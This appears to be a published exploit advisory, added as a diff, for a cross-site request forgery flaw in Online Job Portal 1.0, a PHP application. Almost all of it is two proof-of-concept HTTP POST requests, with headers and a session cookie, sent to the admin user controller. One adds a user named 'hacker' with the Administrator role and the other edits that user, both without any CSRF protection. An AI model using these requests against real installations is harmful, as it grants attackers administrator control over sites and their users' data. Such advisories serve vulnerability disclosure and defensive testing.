@@ -1,0 +1,49 @@
+# Exploit Title: Online Job Portal 1.0 - Cross Site Request Forgery (Add User)
+# Dork: N/A
+# Date: 2020-02-06
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/php/13850/online-job-portal-phppdo.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/jobportal.zip
+# Version: 1.0
+# Tested on: Linux
+# CVE: N/A
+
+# POC: 
+# 1)
+# Add User..
+# 
+POST /admin/user/controller.php?action=add HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 106
+Cookie: PHPSESSID=8aftj770keh6dlgj5sd4a1t5i4
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+user_id=1&deptid=&U_NAME=hacker&deptid=&U_USERNAME=hacker&deptid=&U_PASS=hacker&U_ROLE=Administrator&save=
+# 
+
+# POC: 
+# 2)
+# Edit User..
+# 
+POST /admin/user/controller.php?action=edit HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 121
+Cookie: PHPSESSID=8aftj770keh6dlgj5sd4a1t5i4
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+user_id=1&deptid=&U_NAME=hacker_edit&deptid=&U_USERNAME=hacker_edit&deptid=&U_PASS=hacker_edit&U_ROLE=Administrator&save=
+#
